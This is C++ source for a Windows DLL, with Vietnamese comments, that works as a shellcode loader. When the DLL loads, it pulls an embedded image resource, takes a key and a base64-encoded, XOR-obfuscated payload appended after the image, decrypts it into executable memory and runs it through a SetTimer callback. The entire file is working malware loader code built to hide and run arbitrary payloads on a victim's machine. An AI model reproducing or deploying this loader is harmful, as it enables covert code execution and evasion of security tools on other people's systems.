#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include "../base64.h"

#define RESOURCE_ID 101
#define ORIGIN_IMAGE_FILE 0 // Sẽ được Python script ghi đè tự động

BOOL deobfuscate_payload(const unsigned char* obfuscated, size_t obfuscated_len, const char* key, size_t key_len, unsigned char** output, size_t* output_len) {
    std::string b64((const char*)obfuscated, obfuscated_len);
    std::string decoded = base64_decode(b64);
    if (decoded.empty()) return FALSE;

    size_t payload_len = decoded.length();
    unsigned char* payload = (unsigned char*)malloc(payload_len);
    if (!payload) return FALSE;

    for (size_t i = 0; i < payload_len; i++) {
        payload[i] = decoded[i] ^ key[i % key_len];
    }

    *output = payload;
    *output_len = payload_len;
    return TRUE;
}

BOOL ExecutePayloadViaCallback(unsigned char* Payload, size_t sPayloadSize) {
    LPVOID pShellcodeAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error: %d\n", GetLastError());
        return FALSE;
    }
    printf("[i] Allocated Memory At: 0x%p\n", pShellcodeAddress);
    printf("[#] Writing Payload...\n");

    memcpy(pShellcodeAddress, Payload, sPayloadSize);

    printf("[#] Executing payload via SetTimer callback...\n");
    UINT_PTR dummy = 0;
    MSG msg;

    SetTimer(NULL, dummy, NULL, (TIMERPROC)pShellcodeAddress);
    GetMessageW(&msg, NULL, 0, 0);
    DispatchMessageW(&msg);

    VirtualFree(pShellcodeAddress, 0, MEM_RELEASE);
    return TRUE;
}


DWORD WINAPI MainThread(LPVOID hModule) {
    // 1. Lấy Resource bằng API Win32 chuẩn (RT_RCDATA = MAKEINTRESOURCE(10))
    HRSRC hRes = FindResourceA((HMODULE)hModule, MAKEINTRESOURCEA(RESOURCE_ID), RT_RCDATA);
    if (!hRes) {
        printf("[!] FindResource failed: %lu\n", GetLastError());
        return -1;
    }

    DWORD dwResourceSize = SizeofResource((HMODULE)hModule, hRes);
    HGLOBAL hMem = LoadResource((HMODULE)hModule, hRes);
    unsigned char* pResourceRawData = (unsigned char*)LockResource(hMem);

    if (!pResourceRawData || dwResourceSize <= ORIGIN_IMAGE_FILE) {
        printf("[!] Invalid resource size\n");
        return -1;
    }

    // 2. Tách data được append phía sau ảnh gốc
    size_t appendedSize = dwResourceSize - ORIGIN_IMAGE_FILE;
    if (appendedSize < 33) return -1;

    unsigned char* appendedData = pResourceRawData + ORIGIN_IMAGE_FILE;

    char key[33] = { 0 };
    memcpy(key, appendedData, 32);

    unsigned char* obfuscated = appendedData + 32;
    size_t obfuscated_len = appendedSize - 32;

    printf("[+] Found Resource! Size: %lu | Key: %s\n", dwResourceSize, key);

    // 3. Giải mã Payload
    unsigned char* payload = NULL;
    size_t payload_len = 0;

    if (deobfuscate_payload(obfuscated, obfuscated_len, key, 32, &payload, &payload_len)) {
        printf("[+] Decrypted Payload Size: %zu bytes\n", payload_len);
        if (!ExecutePayloadViaCallback(payload, payload_len)) {
            printf("[!] Payload execution failed\n");
            free(payload);
            return -1;
        }
    }
    else {
        printf("[!] Deobfuscate failed\n");
    }
    

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);

        CreateThread(
            NULL,
            0,
            MainThread,
            hModule,
            0,
            NULL
        );
        //MainThread(hModule);
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}